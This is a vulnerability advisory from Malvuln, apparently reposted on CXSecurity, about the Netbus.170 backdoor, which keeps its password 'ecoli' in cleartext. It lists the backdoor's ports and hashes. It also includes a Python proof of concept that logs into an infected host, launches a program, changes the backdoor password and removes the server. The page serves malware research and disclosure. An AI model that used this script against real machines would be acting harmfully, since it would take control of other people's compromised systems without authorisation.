---
title: Backdoor.Win32.Netbus.170 /  Insecure Credential Storage
url: https://cxsecurity.com/issue/WLB-2025120025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-24
fetch_date: 2025-12-25T03:24:22.636188
---

# Backdoor.Win32.Netbus.170 /  Insecure Credential Storage

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.Netbus.170 / Insecure Credential Storage** **2025.12.24**  Credit:  **[malvuln](https://cxsecurity.com/author/malvuln/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2025
Original source: https://malvuln.com/advisory/086f0693f81f6d40460c215717349a1f.txt
Malvuln Intelligence Feed: https://intel.malvuln.com/
Contact: malvuln13@gmail.com
Media: x.com/malvuln
Threat: Backdoor.Win32.Netbus.170
Vulnerability: Insecure Credential Storage
Family: Netbus
Type: PE32
Attack-pattern TTP: Unsecured Credentials (T1552)
MD5: 086f0693f81f6d40460c215717349a1f
SHA256: bba330e82434d3bcf41e18d7d15df8117883e761aa50858028833a7da84b271c
Vuln ID: MVID-2025-0703
Dropped files: C:\Windows\KeyHook.dll
Disclosure: 12/23/2025
Description: The malware listens on TCP ports 12632 and 12631. The backdoor server password "ecoli" is stored in cleartext in an .INI textfile, stored under "C:\Windows" having the same name as the malware. Third party attackers who have knowledge of the password can login and issue various commands separated by semicolon. Commands include program execution, change the backdoor password and malware removal using command "RemoveServer;1".
[Settings]
Port1=12631
ServerPwd=ecoli
LogTraffic=0
MailTo=
MailFrom=
MailHost=
Exploit/PoC:
from socket import \*
MALWARE\_HOST="x.x.x.x"
PORT=12631
def main():
s=socket(AF\_INET, SOCK\_STREAM)
s.connect((MALWARE\_HOST, PORT))
PAYLOAD="Password;0;ecoli\r\n"
s.send(PAYLOAD.encode())
#Run a program or app:
s.send("StartApp;calc\r\n".encode())
#Change backdoor password
s.send("ServerPwd;malvuln;\r\n".encode())
print(chk\_res(s))
#Remove backdoor use command ; 1
s.send("RemoveServer;1\r\n".encode())
s.close()
if \_\_name\_\_ == "\_\_main\_\_":
main()
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top